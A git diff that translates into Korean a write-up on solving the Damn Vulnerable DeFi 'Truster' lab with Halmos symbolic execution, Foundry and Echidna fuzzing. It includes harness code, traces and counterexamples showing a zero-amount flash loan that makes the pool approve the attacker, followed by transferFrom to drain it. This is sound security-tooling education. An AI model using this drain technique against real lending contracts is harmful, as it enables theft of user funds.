@@ -1,31 +1,37 @@
 # Halmos vs Truster
-## Halmos version
-halmos 0.2.1.dev16+g1502e46 was used in this article
-## Foreword
-It is strongly assumed that the reader is familiar with the previous article on solving [Unstoppable](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/unstoppable), since the main ideas here are largely repeated and we will not dwell on them again. It should also be clearly stated that we have postponed the [Naive-receiver](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/naive-receiver) solution for now, because it is in "Truster" that further necessary techniques for the "Naive-receiver" solution are described. In order not to mislead the reader and not to rush ahead, this order of presentation of the material was chosen.
-## Idea overview
-Based on what we already know, we will again try to make a **SymbolicAttacker** contract that would symbolically execute some transaction and hope that this will lead to the attack we need. But will it be enough this time?
-## Preparation for the attack
-### Common prerequisites 
-1. Copy **Truster.t.sol** file to **TrusterHalmos.t.sol**. All Halmos-related changes should be done here.
-2. Rename `test_truster()` to `check_truster()`, so Halmos will execute this test symbolically.
-3. Avoid using `makeAddr()` cheatcode:
+
+## Halmos 버전
+이 글에서는 halmos 0.2.1.dev16+g1502e46 버전이 사용되었습니다.
+
+## 서문
+독자는 [Unstoppable](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/unstoppable)을 해결하는 이전 글에 익숙하다고 강력하게 가정합니다. 주요 아이디어가 여기에서도 대부분 반복되므로 다시 설명하지 않습니다. 또한 [Naive-receiver](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/naive-receiver) 솔루션은 잠시 미루어 두었음을 분명히 해야 합니다. 왜냐하면 "Naive-receiver" 솔루션에 필요한 추가 기술들이 "Truster"에서 설명되기 때문입니다. 독자를 오도하지 않고 너무 앞서 나가지 않기 위해 이러한 순서로 자료를 제시하기로 했습니다.
+
+## 아이디어 개요
+이미 알고 있는 지식을 바탕으로, 우리는 다시 **SymbolicAttacker** 계약을 만들어 심볼릭 트랜잭션을 실행하고 이것이 우리가 필요한 공격으로 이어지기를 바랄 것입니다. 하지만 이번에도 이것으로 충분할까요?
+
+## 공격 준비
+### 공통 필수 조건
+1. **Truster.t.sol** 파일을 **TrusterHalmos.t.sol**로 복사합니다. 모든 Halmos 관련 변경 사항은 여기서 수행해야 합니다.
+2. `test_truster()`의 이름을 `check_truster()`로 변경하여 Halmos가 이 테스트를 심볼릭하게 실행하도록 합니다.
+3. `makeAddr()` 치트코드 사용을 피하십시오:
     ```solidity
     address deployer = address(0xcafe0000);
     address player = address(0xcafe0001);
     address recovery = address(0xcafe0002);
     ```
-4. `vm.getNonce()` is an unsupported cheatcode. However, we can be sure that the player will perform only one transaction, since all the work will be done under **SymbolicAttacker** anyway. Let's remove this check.
-### Deploying SymbolicAttacker contract
-We still have the same attack technique through the **SymbolicAttacker** contract. However, this time we have nothing to transfer to it - the `player` has no additional resources, so the deployment will look a little easier. Also, don't forget to print all the addresses of contracts - this is very useful information. 
+4. `vm.getNonce()`는 지원되지 않는 치트코드입니다. 하지만 어차피 모든 작업은 **SymbolicAttacker** 하에서 수행되므로 플레이어가 단 하나의 트랜잭션만 수행할 것이라고 확신할 수 있습니다. 이 확인을 제거합시다.
+
+### SymbolicAttacker 계약 배포
+우리는 여전히 **SymbolicAttacker** 계약을 통한 동일한 공격 기술을 가지고 있습니다. 그러나 이번에는 **SymbolicAttacker**에게 전송할 것이 없습니다. `player`는 추가 자원이 없으므로 배포가 조금 더 쉬워 보일 것입니다. 또한 모든 계약의 주소를 출력하는 것을 잊지 마십시오. 이는 매우 유용한 정보입니다.
 ```solidity
 function check_truster() public checkSolvedByPlayer {
     SymbolicAttacker attacker = new SymbolicAttacker();
     attacker.attack();
 }
 ```
-### SymbolicAttacker implementation
-Let's try to use the same code and perform some symbolic transaction:
+
+### SymbolicAttacker 구현
+동일한 코드를 사용하여 심볼릭 트랜잭션을 수행해 봅시다:
 ```solidity
 // SPDX-License-Identifier: MIT
 
@@ -37,14 +43,15 @@ import "forge-std/Test.sol";
 contract SymbolicAttacker is Test, SymTest {
 	function attack() public {
         address target = svm.createAddress("target");
-        vm.assume (target != address(this)); // Avoid recursion
+        vm.assume (target != address(this)); // 재귀 방지
         bytes memory data = svm.createBytes(100, 'data');
         target.call(data);
     }
 }
 ```
-### _isSolved() implementation
-The original checks look like:
+
+### _isSolved() 구현
+원래 확인 로직은 다음과 같습니다:
 ```solidity
 function  _isSolved() private {
 ...
@@ -52,14 +59,15 @@ assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
 assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
 }
 ```
-Then the opposite check will look like this:
+그러면 반대 확인은 다음과 같을 것입니다:
 ```solidity
 function  _isSolved() private {
     ...
     assert(token.balanceOf(address(pool)) != 0 || token.balanceOf(recovery) != TOKENS_IN_POOL);
 }
 ```
-### Starting Halmos
+
+### Halmos 시작
 ```javascript
 $ halmos --solver-timeout-assertion 0 --function check_truster
 ...
@@ -70,9 +78,10 @@ Running 1 tests for test/truster/TrusterHalmos.t.sol:TrusterChallenge
 [PASS] check_truster() (paths: 28, time: 0.74s, bounds: [])
 Symbolic test result: 1 passed; 0 failed; time: 0.82s      
 ```
-And... nothing :(. Passing the test means that it didn't find the way to break this invariant. Let's figure out what's wrong.
-## Debugging and solutions
-Execute this test in verbose mode:
+그리고... 아무것도 없습니다 :(. 테스트를 통과했다는 것은 이 불변 조건을 깨는 방법을 찾지 못했다는 것을 의미합니다. 무엇이 잘못되었는지 알아봅시다.
+
+## 디버깅 및 해결책
+이 테스트를 상세 모드(verbose mode)로 실행합니다:
 ```javascript
 $ halmos --solver-timeout-assertion 0 --function check_truster  -vvvvv
 ...
@@ -87,24 +96,24 @@ Trace:
         ...
             STATICCALL svm::createBytes(0x0000000000000000000000000000000000000000000000000000000000000064000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000046461746100000000000000000000000000000000000000000000000000000000)
             ↩ Concat(0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000064, halmos_data_bytes_80d9faf_02())
-            CALL 0xaaaa0003::Extract(halmos_data_bytes_80d9faf_02())(Extract(halmos_data_bytes_80d9faf_02())) // !!!THIS IS A PROBLEM!!!
+            CALL 0xaaaa0003::Extract(halmos_data_bytes_80d9faf_02())(Extract(halmos_data_bytes_80d9faf_02())) // !!!이것이 문제입니다!!!
             ↩ REVERT 0x (error: Revert())
 ...
 ```
-Let's analyze this reverted path, since this is an unexpected **revert** from non-view function.
-In general, we are interested in these lines:
+비뷰(non-view) 함수에서의 예상치 못한 **revert**이므로 이 되돌려진(reverted) 경로를 분석해 봅시다.
+일반적으로 다음 라인들에 관심이 있습니다:
 ```javascript
 - Extract(0x31f, 0x300, halmos_data_bytes_80d9faf_02) == 0xab19e0c0
 ...
 CALL 0xaaaa0003::Extract(halmos_data_bytes_80d9faf_02())(Extract(halmos_data_bytes_80d9faf_02()))
 ↩ REVERT 0x (error: Revert())
 ```
-`0xaaaa0003` is the address of `pool`. `0xab19e0c0` is the `flashLoan()` function selector:
+`0xaaaa0003`은 `pool`의 주소입니다. `0xab19e0c0`은 `flashLoan()` 함수 선택자입니다:
 ```javascript
 $ cast 4b 0xab19e0c0
 flashLoan(uint256,address,address,bytes)
 ```
-In this case, Halmos tries to resolve the parameters of some external function, but this leads to an immediate revert. Often, this means that we simply do not have enough length for our symbolic calldata. So, do we just need to create a larger calldata?
+이 경우 Halmos는 외부 함수의 매개변수를 해결하려고 시도하지만 즉시 revert로 이어집니다. 종종 이것은 우리의 심볼릭 calldata에 대한 길이가 충분하지 않음을 의미합니다. 그렇다면 더 큰 calldata를 생성하면 될까요?
 ```solidity
 contract SymbolicAttacker is Test, SymTest {
 	function attack() public {
@@ -113,7 +122,7 @@ contract SymbolicAttacker is Test, SymTest {
 	...
 	}
 ```
-And execute:
+그리고 실행:
 ```javascript
 $ halmos --solver-timeout-assertion 0 --function check_truster
 ...
@@ -121,20 +130,20 @@ $ halmos --solver-timeout-assertion 0 --function check_truster
 WARNING:halmos:Encountered symbolic CALLDATALOAD offset: 4 + Extract(79199, 78944, halmos_data_bytes_8bdc959_02)
 Symbolic test result: 0 passed; 1 failed; time: 3.90s
 ```
-Hmm, something new. What this warning actually means is that we're passing some calldata bytes to the function as a parameter, but we're doing it via a symbolic call. In simple words, Halmos does not understand where to put **calldata as a parameter** in our symbolic calldata and throws an **error**. 
-Let's not delay, it is obvious that this function is our `flashLoan()`. Its 4th parameter is `bytes calldata data`:
+음, 뭔가 새로운 것입니다. 이 경고가 실제로 의미하는 바는 우리가 함수에 매개변수로 일부 calldata 바이트를 전달하고 있지만, 이를 심볼릭 호출을 통해 수행하고 있다는 것입니다. 간단히 말해서, Halmos는 심볼릭 calldata에서 **매개변수로서의 calldata**를 어디에 두어야 할지 이해하지 못하고 **오류**를 발생시킵니다.
+지체하지 말고 봅시다. 이 함수가 우리의 `flashLoan()`임은 분명합니다. 4번째 매개변수는 `bytes calldata data`입니다:
 ```solidity
 contract TrusterLenderPool is ReentrancyGuard {
 ...
 function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
 ```
-Fortunately, Halmos provides a special cheat-code for such cases: `svm.createCalldata()`. All we need to generate valid calldata is the contract type name passed as a parameter to this cheat-code. One of the most obvious ways to use it in our **SymbolicAttacker** is this piece of code:
+다행히 Halmos는 이러한 경우를 위한 특별한 치트 코드 `svm.createCalldata()`를 제공합니다. 유효한 calldata를 생성하기 위해 필요한 것은 이 치트 코드에 매개변수로 전달되는 계약 유형 이름뿐입니다. **SymbolicAttacker**에서 이를 사용하는 가장 확실한 방법 중 하나는 다음 코드 조각입니다:
 ```solidity
 contract SymbolicAttacker is Test, SymTest {
     function attack() public {
         address target = svm.createAddress("target");
         bytes memory data;
-        vm.assume (target != address(this)); // Avoid recursion
+        vm.assume (target != address(this)); // 재귀 방지
         if (target == address(0xaaaa0002)) { // token
             data = svm.createCalldata("DamnValuableToken");
         }
@@ -148,14 +157,14 @@ contract SymbolicAttacker is Test, SymTest {
     }
 }
 ```
-Run:
+실행:
 ```javascript
 $ halmos --solver-timeout-assertion 0 --function check_truster
 ...
 [ERROR] check_truster() (paths: 193, time: 10.48s, bounds: []) 
 WARNING:halmos:Encountered symbolic CALLDATALOAD offset: 4 + Extract(7391, 7136, p_data_bytes_9090625_07)
 ```
-What? Same error again? Actually no. Firstly, the number of paths has increased: 193 against 38, and secondly, this one now appears in another function:
+뭐라구요? 또 같은 오류인가요? 사실 아닙니다. 첫째, 경로 수가 38개에서 193개로 증가했고, 둘째, 이 오류는 이제 다른 함수에서 나타납니다:
 ```javascript
 $ halmos --solver-timeout-assertion 0 --function check_truster -vvvvv
 Path #108:
@@ -167,7 +176,7 @@ Trace:
                 ↩ CALLDATALOAD 0x (error: NotConcreteError('symbolic CALLDATALOAD offset: 4 + Extract(7391, 7136, p_data_bytes_334a71c_07)'))
 ...
 ```
-The error is some symbolic call in `TrusterLenderPool::flashLoan()` function:
+오류는 `TrusterLenderPool::flashLoan()` 함수 내의 어떤 심볼릭 호출입니다:
 ```solidity
 function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
 ...
@@ -176,9 +185,10 @@ function flashLoan(uint256 amount, address borrower, address target, bytes calld
     target.functionCall(data);
 }
 ```
-Yes, since the `data` parameter also turned out to be symbolic, we got into the same pattern again and got the same error. However, this time, knowing that we can get to a symbolic call of a symbolic address in any contract, we will use a more universal solution!
-## Global storage
-Let's create a library global storage contract that can be accessed from anywhere:
+네, `data` 매개변수도 심볼릭으로 판명되었기 때문에 다시 같은 패턴에 빠져 같은 오류가 발생했습니다. 하지만 이번에는 어떤 계약의 심볼릭 주소에 대한 심볼릭 호출에 도달할 수 있다는 것을 알았으므로 더 보편적인 해결책을 사용할 것입니다!
+
+## 전역 저장소 (Global storage)
+어디서나 액세스할 수 있는 라이브러리 전역 저장소 계약을 만들어 봅시다:
 ```solidity
 // SPDX-License-Identifier: MIT
 
@@ -188,13 +198,13 @@ import "./halmos-cheatcodes/src/SymTest.sol";
 import {Test, console} from "forge-std/Test.sol";
 
 contract GlobalStorage is SymTest {
-    // uint256->address mapping to have an ability to iterate over addresses
+    // 주소를 반복할 수 있는 기능을 갖기 위한 uint256->address 매핑
     mapping (uint256 => address) addresses;
     mapping (address => string) names_by_addr;
 
     uint256 addresses_list_size = 0;
 
-    // Addresses and names information is stored using this setter
+    // 주소와 이름 정보는 이 설정자를 사용하여 저장됩니다
     function add_addr_name_pair (address addr, string memory name) public {
         addresses[addresses_list_size] = addr;
         addresses_list_size++;
@@ -202,12 +212,12 @@ contract GlobalStorage is SymTest {
     }
 
     /*
-    ** if addr is a concrete value, this returns (addr, symbolic calldata for addr)
-    ** if addr is symbolic, execution will split for each feasible case and it will return 
-    **      (addr0, symbolic calldata for addr0), (addr1, symbolic calldata for addr1), 
-            ..., and so on (one pair per path)
-    ** if addr is symbolic but has only 1 feasible value (e.g. with vm.assume(addr == ...)), 
-            then it should behave like the concrete case
+    ** addr이 구체적인 값이면 (addr, addr에 대한 심볼릭 calldata)를 반환합니다.
+    ** addr이 심볼릭이면 실행이 실행 가능한 각 사례에 대해 분할되고 다음을 반환합니다.
+    **      (addr0, addr0에 대한 심볼릭 calldata), (addr1, addr1에 대한 심볼릭 calldata), 
+    **      ..., 등등 (경로당 한 쌍)
+    ** addr이 심볼릭이지만 실행 가능한 값이 1개뿐인 경우(예: vm.assume(addr == ...)), 
+    **      구체적인 경우처럼 동작해야 합니다.
     */
     function get_concrete_from_symbolic (address /*symbolic*/ addr) public view 
                                         returns (address ret, bytes memory data) 
@@ -218,24 +228,24 @@ contract GlobalStorage is SymTest {
                 return (addresses[i], svm.createCalldata(name));
             }
         }
-        revert(); // Ignore cases when addr is not some concrete known address
+        revert(); // addr이 알려진 구체적인 주소가 아닌 경우는 무시
     }
 }
 ```
 
-We will not dwell on the implementation details of this contract. I will only say that this is a contract in which you can store `address => <contract name>` pairs. And also with its help you can conveniently brute force addresses symbolically. It is easier to show how to use it in practice. First, let's prepare **GlobalStorage** in TrusterHalmos.t.sol:
+이 계약의 구현 세부 사항에 대해서는 자세히 설명하지 않겠습니다. `address => <계약 이름>` 쌍을 저장할 수 있는 계약이라고만 말씀드리겠습니다. 또한 이를 통해 주소를 심볼릭하게 편리하게 무차별 대입(brute force)할 수 있습니다. 실제로 어떻게 사용하는지 보여주는 것이 더 쉽습니다. 먼저 TrusterHalmos.t.sol에서 **GlobalStorage**를 준비해 봅시다:
 ```solidity
 ...
 import "lib/GlobalStorage.sol";
 ...
 contract TrusterChallenge is Test {
 ...
-    GlobalStorage public glob; // Add global storage contract
+    GlobalStorage public glob; // 전역 저장소 계약 추가
     DamnValuableToken public token;
 ...
     function setUp() public {
     ...
-        // Deploy global storage. It'll have a "0xaaaa0002" address
+        // 전역 저장소 배포. "0xaaaa0002" 주소를 갖게 됩니다.
         glob = new GlobalStorage();
     ...
         glob.add_addr_name_pair(address(token), "DamnValuableToken");
@@ -244,30 +254,30 @@ contract TrusterChallenge is Test {
     }
 ...
 ```
-We will use it in SymbolicAttacker:
+SymbolicAttacker에서 이것을 사용할 것입니다:
 ```solidity
 ...
 import "lib/GlobalStorage.sol";
 ...
 contract SymbolicAttacker is Test, SymTest {
-    // We can hardcode this address for convenience
+    // 편의를 위해 이 주소를 하드코딩할 수 있습니다
     GlobalStorage glob = GlobalStorage(address(0xaaaa0002)); 
 
     function attack() public {
         address target = svm.createAddress("target");
         bytes memory data;
-        //Get some concrete target-name pair
+        //구체적인 target-name 쌍 얻기
         (target, data) = glob.get_concrete_from_symbolic(target);
         target.call(data);
     }
 }
 ```
-And in TrusterLenderPool:
+그리고 TrusterLenderPool에서:
 ```solidity
 ...
 GlobalStorage glob = GlobalStorage(address(0xaaaa0002)); 
 ...
-// Symbolic flashloan function
+// 심볼릭 flashloan 함수
 function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
     external
     nonReentrant
@@ -277,7 +287,7 @@ function flashLoan(uint256 amount, address borrower, address target, bytes calld
 
     token.transfer(borrower, amount);
 
-    // Work with "newdata" like this is the "data"
+    // "data"인 것처럼 "newdata"로 작업
     bytes memory newdata;
     (target, newdata) = glob.get_concrete_from_symbolic(target);
     target.functionCall(newdata);
@@ -289,7 +299,7 @@ function flashLoan(uint256 amount, address borrower, address target, bytes calld
     return true;
 }
 ```
-And run Halmos:
+Halmos 실행:
 ```javascript
 $ halmos --solver-timeout-assertion 0 --function check_truster
 ...
@@ -299,18 +309,18 @@ $ halmos --solver-timeout-assertion 0 --function check_truster
 [console.log] attacker   0x00000000000000000000000000000000000000000000000000000000aaaa0005
 [PASS] check_truster() (paths: 132, time: 8.24s, bounds: [])
 ```
-Halmos still can't find a counterexample. But at least now there are no such errors and all functions are covered. Let's go to the next step!
-## Another transaction
-Finally, we got to the most interesting part. If the problem is not solved in one transaction, we will add another one:
+Halmos는 여전히 반례를 찾지 못합니다. 하지만 적어도 이제는 그러한 오류가 없으며 모든 함수가 커버됩니다. 다음 단계로 넘어갑시다!
+## 또 다른 트랜잭션
+드디어 가장 흥미로운 부분에 도달했습니다. 한 번의 트랜잭션으로 문제가 해결되지 않으면 하나 더 추가할 것입니다:
 ```solidity
 contract SymbolicAttacker is Test, SymTest {
-    // We can hardcode this address for convenience
+    // 편의를 위해 이 주소를 하드코딩할 수 있습니다
     GlobalStorage glob = GlobalStorage(address(0xaaaa0002)); 
 
     function execute_tx() private {
         address target = svm.createAddress("target");
         bytes memory data;
-        //Get some concrete target-name pair
+        //구체적인 target-name 쌍 얻기
         (target, data) = glob.get_concrete_from_symbolic(target);
         target.call(data);
     }
@@ -321,7 +331,7 @@ contract SymbolicAttacker is Test, SymTest {
     }
 }
 ```
-Run:
+실행:
 ```javascript
 $ halmos --solver-timeout-assertion 0 --function check_truster
 ...
@@ -378,7 +388,7 @@ p_to_address_c01d91b_40 = 0x0000000000000000000000000000000000000000000000000000
 ...
 Symbolic test result: 0 passed; 1 failed; time: 1366.30s
 ```
-Symbolic execution of even two attacking transactions is hard work, so it took as much as 23 minutes on my machine. But there is also good news - Halmos did find 3 unique counterexamples. However, it is not yet clear which functions were called. Therefore, we will use the following hint:
+단 2개의 공격 트랜잭션을 심볼릭하게 실행하는 것도 힘든 작업이므로, 제 컴퓨터에서는 무려 23분이 걸렸습니다. 하지만 좋은 소식도 있습니다 - Halmos가 3개의 고유한 반례를 찾았습니다. 하지만 어떤 함수가 호출되었는지는 아직 명확하지 않습니다. 따라서 다음과 같은 힌트를 사용할 것입니다:
 ```solidity
 contract GlobalStorage is Test, SymTest {
 ...
@@ -390,16 +400,17 @@ function get_concrete_from_symbolic (address /*symbolic*/ addr) public view
             ret = addresses[i];
             data = svm.createCalldata(name);
             bytes4 selector = svm.createBytes4("selector");
-            vm.assume(selector == bytes4(data)); // Now Halmos will show us selectors
+            vm.assume(selector == bytes4(data)); // 이제 Halmos가 선택자(selectors)를 보여줄 것입니다
             return (ret, data);
         }
     }
-    revert(); // Ignore cases when addr is not some concrete known address
+    revert(); // addr이 알려진 구체적인 주소가 아닌 경우는 무시
 }
 ```
-Now, Halmos shows us that selectors. 
-## Counterexamples analysis
-Let's analyze each counterexample one by one:
+이제 Halmos가 선택자들을 보여줍니다.
+
+## 반례 분석
+각 반례를 하나씩 분석해 봅시다:
 ```javascript
 Counterexample:
 halmos_selector_bytes4_1442fb7_18 = permit
@@ -417,8 +428,8 @@ p_to_address_8272409_34 = 0x0000000000000000000000000000000000000000000000000000
 p_v_uint8_49e43a7_10 = 0x0000000000000000000000000000000000000000000000000000000000000000
 p_value_uint256_d5bb651_08 = 0x80000000000000000000000000000000000000000000005000200e0000000000
 ```
-Wow, Halmos thinks an attacker can call the [permit](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#IERC20Permit-permit-address-address-uint256-uint256-uint8-bytes32-bytes32-) function from **ERC20** with pool's signature, thereby allowing to call `transferFrom()`, sending all funds to the `recovery` account.  The problem is that the `attacker` does not have a private key from the `pool`, so he cannot craft such a function call. Obviously, we cannot use symbolic analysis to crack the cryptography of signatures. And the null bytes provided by Halmos for the `v`, `r` and `s` parameters confirm this. Therefore, this is, unfortunately, a fake solution.
-The situation is similar with the second counterexample:
+와, Halmos는 공격자가 풀(pool)의 서명으로 **ERC20**의 [permit](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#IERC20Permit-permit-address-address-uint256-uint256-uint8-bytes32-bytes32-) 함수를 호출하여 `transferFrom()`을 호출하고 모든 자금을 `recovery` 계정으로 보낼 수 있다고 생각합니다. 문제는 `attacker`가 `pool`의 개인 키를 가지고 있지 않으므로 그러한 함수 호출을 조작할 수 없다는 것입니다. 분명히 우리는 심볼릭 분석을 사용하여 서명 암호화를 해독할 수 없습니다. 그리고 Halmos가 `v`, `r`, `s` 매개변수로 제공한 널(null) 바이트가 이를 확인해 줍니다. 따라서 이것은 불행히도 가짜 해결책입니다.
+두 번째 반례도 상황이 비슷합니다:
 ```javascript
 Counterexample:
 halmos_selector_bytes4_6aa2890_44 = transferFrom
@@ -441,9 +452,9 @@ p_to_address_9bc8f39_42 = 0x0000000000000000000000000000000000000000000000000000
 p_v_uint8_88f0351_18 = 0x0000000000000000000000000000000000000000000000000000000000000000
 p_value_uint256_a28c1c2_16 = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff 
 ```
-Here is the same `permit`, but this time we entered it from under `flashLoan()`. Interestingly, we noticed here: if you pass the `amount` to `flashLoan()` as `0`, the transaction will still go through, and nothing needs to be returned.
+이것도 동일한 `permit`이지만, 이번에는 `flashLoan()` 하에서 입력했습니다. 흥미롭게도 여기서는 `0`으로 `flashLoan()`에 `amount`를 전달하면 트랜잭션이 여전히 통과하고 아무것도 반환할 필요가 없다는 것을 알게 되었습니다.
 
-And only for the third time, finally, Halmos did find a solution to this problem. Although it was spinning nearby :D 
+그리고 세 번째 만에 드디어 Halmos가 실제로 이 문제에 대한 해결책을 찾았습니다. 근처에서 맴돌고 있었음에도 말이죠 :D
 ```javascript
 Counterexample:
 halmos_selector_bytes4_1034b81_26 = approve
@@ -461,9 +472,10 @@ p_spender_address_429fd9d_12 = 0x00000000000000000000000000000000000000000000000
 p_target_address_de4b479_06 = 0x00000000000000000000000000000000000000000000000000000000aaaa0003
 p_to_address_50e8baf_42 = 0x00000000000000000000000000000000000000000000000000000000cafe0002 
 ```
-Of course, we call `flashLoan` with the parameter `amount=0`, force the `pool` during flashLoan to call `approve()` of all tokens for attacker. And then we just make `transferFrom()` `pool` to `recovery` as the second transaction.
-## Using a counterexample
-We need these addresses in forge:
+물론, `amount=0`으로 `flashLoan`을 호출하고, flashLoan 동안 `pool`이 공격자를 위해 모든 토큰에 대해 `approve()`를 호출하도록 강제합니다. 그리고 두 번째 트랜잭션으로 `pool`에서 `recovery`로 `transferFrom()`을 수행합니다.
+
+## 반례 사용
+forge에서 이 주소들이 필요합니다:
 ```javascript
 $ forge test -vvv --mp test/truster/Truster.t.sol
 ...
@@ -493,7 +505,7 @@ contract Attacker {
     }
 } 
 ```
-Run:
+실행:
 ```javascript
 $ forge test -vvv --mp test/truster/Truster.t.sol
 ...
@@ -505,10 +517,11 @@ Logs:
 Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 1.24ms (386.40µs CPU time)
 ...
 ```
-Passed! Halmos successfully solved this problem as well.
-## Fuzzing time!
+통과! Halmos가 이 문제도 성공적으로 해결했습니다.
+
+## 퍼징 타임!
 ### Foundry
-Let's start with Foundry invariant testing. For "fairness" sake, we'll also give it plenty of time to run.
+Foundry 불변성 테스트(invariant testing)로 시작해 봅시다. "공정성"을 위해 실행할 시간도 충분히 주겠습니다.
 
 Foundry.toml:
 ```javascript
@@ -527,7 +540,7 @@ function invariant_isSolved() public {
     assert(token.balanceOf(address(pool)) >= TOKENS_IN_POOL);
 }
 ```
-As an invariant, the criterion "Can we decrease the balance of the pool at all?" was selected. Try it:
+불변 조건으로 "풀의 잔액을 줄일 수 있는가?"라는 기준이 선택되었습니다. 시도:
 ```javascript
 $ forge test -vvvvv --mp test/truster/Truster_Fuzz.t.sol
 ...
@@ -538,7 +551,7 @@ $ forge test -vvvvv --mp test/truster/Truster_Fuzz.t.sol
 [6974] DamnValuableToken::transfer(0x5BE45f33883Ce9E32a648b77F365b4A292C360cE, 0)
 ...
 ```
-Nothing. Even no successful transaction using `flashLoan()`. So, I decided to give the fuzzer a big tip:
+아무것도 없습니다. `flashLoan()`을 사용한 성공적인 트랜잭션조차 없습니다. 그래서 퍼저에게 큰 힌트를 주기로 했습니다:
 ```solidity
 // Fuzz flashloan function
 
@@ -563,7 +576,7 @@ function _flashLoan(uint256 amount, address borrower)
     return true;
 }
 ```
-Yes, this is a ready transaction to approve tokens. Run:
+네, 이것은 토큰을 승인하기 위해 준비된 트랜잭션입니다. 실행:
 ```javascript
 $ forge test -vvvvv --mp test/truster/Truster_Fuzz.t.sol
 ...
@@ -572,8 +585,8 @@ $ forge test -vvvvv --mp test/truster/Truster_Fuzz.t.sol
                 sender=0x44E97aF4418b7a17AABD8090bEA0A471a366305C addr=[src/truster/TrusterLenderPool.sol:TrusterLenderPool]0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264 calldata=_flashLoan(uint256,address) args=[0, 0x85B3d986977391795F57ce5c08d0E1925c7ADc80]
                 sender=0x44E97aF4418b7a17AABD8090bEA0A471a366305C addr=[src/DamnValuableToken.sol:DamnValuableToken]0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b calldata=transferFrom(address,address,uint256) args=[0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264, 0x000000000000000000000000000000000000022D, 67]
 ```
-With this hint, the Foundry fuzzer did find the attack. As I understand it, the very construction of some transaction through target and data passed through parameters is already a problem for Foundry fuzzer.
-Okay, so let's rewrite our hint, but make it less explicit and avoid passing target and data through parameters:
+이 힌트로 Foundry 퍼저는 공격을 찾아냈습니다. 제가 이해하기로는 매개변수를 통해 전달된 대상과 데이터를 통해 일부 트랜잭션을 구성하는 것 자체가 이미 Foundry 퍼저에게는 문제인 것 같습니다.
+좋습니다, 힌트를 다시 작성해봅시다. 덜 명시적이고 매개변수를 통해 대상과 데이터를 전달하지 않도록 합시다:
 ```solidity
 // Fuzz flashloan function (less hint)
 function __flashLoan(uint256 amount, address borrower, bool is_approve, address to, uint256 amount_to_approve)
@@ -594,7 +607,7 @@ function __flashLoan(uint256 amount, address borrower, bool is_approve, address 
     return true;
 }
 ```
-Here, it is enough to pass is `is_approve = true`, `to` as the address of the `player`, and a rather large `amount_to_approve` to the fuzzer. And perform `transferFrom()` with another transaction. Let's try:
+여기서 퍼저에게 `is_approve = true`, `to`를 `player`의 주소로, 그리고 꽤 큰 `amount_to_approve`만 전달하면 충분합니다. 그리고 다른 트랜잭션으로 `transferFrom()`을 수행합니다. 시도해 봅시다:
 ```javascript
 $ forge test -vvvvv --mp test/truster/Truster_Fuzz.t.sol
 ...
@@ -610,10 +623,11 @@ $ forge test -vvvvv --mp test/truster/Truster_Fuzz.t.sol
 ...
 Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1644.57s (1644.57s CPU time)
 ```
-All transaction sequences with `flashLoan()`->`approve()` did not lead to anything, because some random addresses, which are not even deployed, were always chosen as the `to` parameter. We could still experiment with hints, but in my opinion such logic of the fuzzer is already too weak. Even if the solution exist, then we still have to twist the fuzzer logic a lot to achieve an acceptable result.
-So let's try something different.
+`flashLoan()`->`approve()` 시퀀스의 모든 트랜잭션은 아무런 결과도 낳지 못했습니다. 왜냐하면 배포되지 않은 임의의 주소들이 항상 `to` 매개변수로 선택되었기 때문입니다. 힌트를 가지고 더 실험해 볼 수는 있겠지만, 제 생각에 그러한 퍼저 로직은 이미 너무 약합니다. 해결책이 존재하더라도, 허용 가능한 결과를 얻으려면 여전히 퍼저 로직을 많이 비틀어야 합니다.
+그러니 다른 방법을 시도해 봅시다.
+
 ### Echidna
-I chose Echidna as another fuzzing engine. Echidna-styled invariant testing contract:
+저는 또 다른 퍼징 엔진으로 Echidna를 선택했습니다. Echidna 스타일의 불변성 테스트 계약입니다:
 ```solidity
 // SPDX-License-Identifier: MIT
 // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
@@ -630,10 +644,10 @@ contract TrusterEchidna {
     TrusterLenderPool public pool;
 
     constructor() public payable {
-        // Deploy token
+        // 토큰 배포
         token = new DamnValuableToken();
 
-        // Deploy pool and fund it
+        // 풀 배포 및 자금 조달
         pool = new TrusterLenderPool(token);
         token.transfer(address(pool), TOKENS_IN_POOL);
     
@@ -655,7 +669,7 @@ sender: ['0xcafe0002']
 allContracts: true
 workers: 8
 ```
-First, let's try again with a "clean" **TrusterLenderPool**:
+먼저, "깨끗한" **TrusterLenderPool**로 다시 시도해 봅시다:
 ```javascript
 $ forge build
 ...
@@ -666,7 +680,7 @@ Unique instructions: 2864
 Corpus size: 15
 Seed: 5278472965973577621
 ```
-Unfortunately, nothing. Maybe with a hint, Echidna will find a solution? (Second "hinted" `flashLoan()` function was used):
+불행히도 아무것도 없습니다. 아마 힌트를 주면 Echidna가 해결책을 찾을 수 있을까요? (두 번째 "힌트가 있는" `flashLoan()` 함수가 사용되었습니다):
 ```javascript
 $ forge build
 ...
@@ -678,7 +692,7 @@ echidna_testSolved: failed!
         DamnValuableToken.transferFrom(0x62d69f6867a0a084c6d313943dc22023bc263691,0x0,1)
 ...
 ```
-Hooray! In this case, **Echidna** did find a sequence that breaks the invariant. However, we still gave a very large hint for the fuzzer. Therefore, let's consider all possible calls that could be made from under `flashLoan()` (At least those that are in the setup). Ladies and gentlemen, meet FRANKENSTEIN:
